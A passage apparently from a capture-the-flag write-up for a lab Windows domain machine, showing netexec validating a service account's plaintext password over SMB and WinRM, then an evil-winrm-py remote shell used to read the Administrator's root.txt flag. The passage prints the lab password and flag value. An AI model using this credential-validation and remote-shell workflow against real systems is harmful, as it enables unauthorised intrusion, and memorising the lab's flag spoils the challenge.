SMB         10.129.234.176  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.176  445    INVENTORY        [+] sweep.vl\svc_inventory_win:4^56!sK&}eA? (Pwn3d!)
oxdf@hacky$ netexec winrm inventory.sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?'
WINRM       10.129.234.176  5985   INVENTORY        [*] Windows Server 2022 Build 20348 (name:INVENTORY) (domain:sweep.vl) 
WINRM       10.129.234.176  5985   INVENTORY        [+] sweep.vl\svc_inventory_win:4^56!sK&}eA? (Pwn3d!)
```

svc\_inventory\_win is in the Administrators group:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ evil-winrm-py -i inventory.sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'inventory.sweep.vl:5985' as 'svc_inventory_win'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\svc_inventory_win\Documents> whoami
sweep\svc_inventory_win
evil-winrm-py PS C:\Users\Administrator> cd Desktop
evil-winrm-py PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----          8/5/2025   5:43 AM             33 root.txt                                                              


evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
71770ae0f007e2aed64425728977cc65
evil-winrm-py PS C:\Users\Administrator\Desktop>

```
